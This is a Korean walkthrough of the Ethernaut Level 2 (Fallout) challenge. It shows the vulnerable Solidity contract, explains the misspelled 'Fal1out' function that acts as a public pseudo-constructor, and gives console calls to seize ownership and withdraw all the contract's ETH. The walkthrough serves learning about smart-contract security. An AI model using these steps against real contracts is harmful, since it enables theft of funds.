## Ethernaut Level 2

## 문제 설명

Level 2는 스마트 컨트랙트의 **생성자(Constructor) 오타 취약점**을 이용하는 문제입니다. 컨트랙트 소유권을 탈취하고, 컨트랙트에 쌓인 ETH를 전부 빼내는 것이 목표입니다.

---

## 컨트랙트 분석

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

### 핵심 취약점: Typo Constructor

Solidity `^0.6.0` 에서 생성자는 반드시 `constructor()` 키워드를 사용해야 합니다.

그런데 이 컨트랙트에는 주석으로 `/* constructor */` 라고 표시되어 있지만, 실제 함수 이름은 `Fal1out` 입니다.

```
컨트랙트 이름: Fallout   ← 영문자 'l' (엘)
함수 이름:    Fal1out   ← 숫자 '1' (일)
                  ↑
         이 오타 하나가 생성자를 일반 함수로 만들어버림
```

결과적으로 `Fal1out()` 은 **누구든지 언제든지 호출할 수 있는 일반 함수**가 되었고, 호출 즉시 `owner` 가 호출자 주소로 덮어씌워집니다.

---

## 공격 단계

---

### Step 1 — 현재 상태 확인

브라우저에서 `F12` → **Console** 탭으로 이동합니다.

```javascript
// 현재 owner 확인 (배포자 주소 또는 zero address)
await contract.owner()

// 내 주소 확인
player

// 컨트랙트 잔액 확인
await getBalance(contract.address)
```

---

### Step 2 — Fal1out() 호출로 owner 탈취

```javascript
await contract.Fal1out({ value: 0 })
```

이 한 줄로 `owner` 가 내 주소(`player`)로 변경됩니다.

---

### Step 3 — owner 변경 확인

```javascript
await contract.owner()
// → 내 주소(player) 와 동일하면 성공 (owner가 자신의 지갑주소로 되는것이 클리어 조건이기 때문에 여기까지만 해도 클리어 가능.)
```

아래와 같이 비교해서 확인할 수 있습니다.

```javascript
(await contract.owner()) === player
// → true
```

---

### Step 4 — collectAllocations() 로 잔액 수거

`owner` 권한이 생겼으므로 `onlyOwner` modifier 가 붙은 함수를 호출할 수 있습니다.

```javascript
await contract.collectAllocations()
```

컨트랙트에 쌓인 모든 ETH 가 내 지갑으로 송금됩니다.

---

